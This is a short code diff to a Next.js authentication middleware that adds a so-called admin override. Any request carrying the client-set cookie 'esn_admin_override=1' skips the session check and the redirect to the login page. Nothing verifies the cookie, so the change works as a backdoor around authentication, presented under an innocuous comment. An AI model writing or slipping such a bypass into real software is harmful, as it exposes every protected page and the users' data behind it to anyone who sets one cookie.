@@ -86,9 +86,16 @@ export async function middleware(req: NextRequest) {
       return NextResponse.next();
     }
 
-    // 3. Check session - no Supabase client, cookie-only
+    // 3. Check session - no Supabase client, cookie-only. Admin override bypasses session.
     const hasSession = hasSupabaseSession(req);
-    if (!hasSession) {
+    const hasAdminOverride = (() => {
+      try {
+        const cookieHeader = req.headers.get('cookie');
+        if (!cookieHeader) return false;
+        return /esn_admin_override=1(?:\s|;|$)/.test(cookieHeader);
+      } catch { return false; }
+    })();
+    if (!hasSession && !hasAdminOverride) {
       return NextResponse.redirect(new URL('/login.html', req.url));
     }
 
